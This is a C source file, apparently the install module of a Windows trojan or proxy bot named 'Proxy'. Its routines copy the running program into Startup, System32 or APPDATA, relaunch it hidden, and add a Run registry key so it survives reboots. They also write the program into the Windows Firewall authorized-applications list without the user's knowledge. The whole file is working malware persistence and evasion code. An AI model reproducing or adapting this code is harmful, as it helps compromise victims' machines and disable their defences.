/**
 * Proxy
 * Copyright ©2008 Loki - All Rights Reserved
 **/

#include <windows.h>
#include <shellapi.h>
#include <stdlib.h>
#include <stdio.h>
#include "global.h"
#include "info.h"
#include "install.h"

/**
 * @name                          install_self
 * @param                 File    File name
 * @param                 Name    Registry key name
 * @param                Admin    Admin boolean
 * @param              Version    Windows version
 * @note                          Installs the current processes module
 **/
void install_self( char* File, char* Name, BOOL Admin, ver_t Version )
{
    char  Self[MAX_PATH],
          Dest[MAX_PATH],
          Del [MAX_PATH],
         *Env = NULL;
    memset( &Self, 0, sizeof(Self) );
    memset( &Dest, 0, sizeof(Dest) );
    memset( &Del,  0, sizeof(Del)  );
    GetModuleFileName( GetModuleHandle(NULL), Self, sizeof(Self) );
    if( Version == WIN_VISTA ) {
        Env = getenv( "APPDATA" );
        _snprintf( Dest, sizeof(Dest),
                   "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s",
                   Env, File );
        // %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\FileName.exe
    } else {
        if( Admin ) {
            Env = getenv( "SYSTEMROOT" );
            _snprintf( Dest, sizeof(Dest),
                       "%s\\System32\\%s",
                       Env, File );
            // %SYSTEMROOT%\System32\FileName.exe
        } else {
#if 0   
            Env = getenv( "USERPROFILE" );
            _snprintf( Dest, sizeof(Dest),
                       "%s\\Start Menu\\Programs\\Startup\\%s",
                       Env, File );
#else
            Env = getenv( "APPDATA" );
            _snprintf( Dest, sizeof(Dest),
                       "%s\\%s",
                       Env, File );
#endif
            // %USERPROFILE%\Start Menu\Programs\Startup\FileName.exe
            // %USERPROFILE%\Application Data\FileName.exe
        }
    }
    if( strcmp(Self, Dest) != 0 )
    {
#ifdef _DEBUG
        printf( "Installing to: %s\n", Dest );
#endif // _DEBUG
        CopyFile( Self, Dest, FALSE );
        install_registry( Dest, Name, Admin, Version );
        if( Admin )
            install_fwb( Dest, Name );
        GetShortPathName( Self, Del, sizeof(Del) );
        ShellExecute( NULL, "open", Dest, Del, NULL, SW_HIDE );
        ExitProcess( 0 );
    }
}

/**
 * @name                          install_registry
 * @param                 Path    Path to the file
 * @param                 Name    Registry key name
 * @param                Admin    Admin boolean
 * @param              Version    Windows version
 * @note                          Adds a key to the registry
 **/
void install_registry( char* Path, char* Name, BOOL Admin, ver_t Version )
{
    HKEY Key  = NULL,
         Tree = NULL;
    if( Version == WIN_VISTA )
        return;
    if( Admin )
        Tree = HKEY_LOCAL_MACHINE;
    else
        Tree = HKEY_CURRENT_USER;
    if( RegCreateKeyEx(Tree,
                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0,
                       NULL,
                       REG_OPTION_NON_VOLATILE,
                       KEY_ALL_ACCESS,
                       NULL,
                      &Key,
                       NULL) == ERROR_SUCCESS )
    {
#ifdef _DEBUG
        printf( "Created registry key: %s\n", Name );
#endif // _DEBUG
        RegSetValueEx( Key,
                       Name,
                       0,
                       REG_SZ,
                      (cuchar*)Path,
                       strlen(Path) );
        RegCloseKey( Key );
    }
}

/**
 * @name                          install_fwb
 * @param                 Path    Path to the file
 * @param                 Name    Registry key name
 * @note                          Adds a program to the allowed list for windows firewall
 **/
void install_fwb( char* Path, char* Name )
{
    HKEY Key = NULL;
    char Val[256];
    memset( &Val, 0, sizeof(Val) );
    _snprintf( Val, sizeof(Val), "%s:*:Enabled:%s", Path, Name );
    RegCreateKeyEx( HKEY_LOCAL_MACHINE,
                    "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List",
                    0,
                    0,
                    REG_OPTION_NON_VOLATILE,
                    KEY_ALL_ACCESS,
                    NULL,
                    &Key,
                    0 );
    RegSetValueEx( Key,
                   Path,
                   0,
                   REG_SZ,
                   (cuchar*)Val,
                   strlen(Val) );
    RegCloseKey( Key );
}
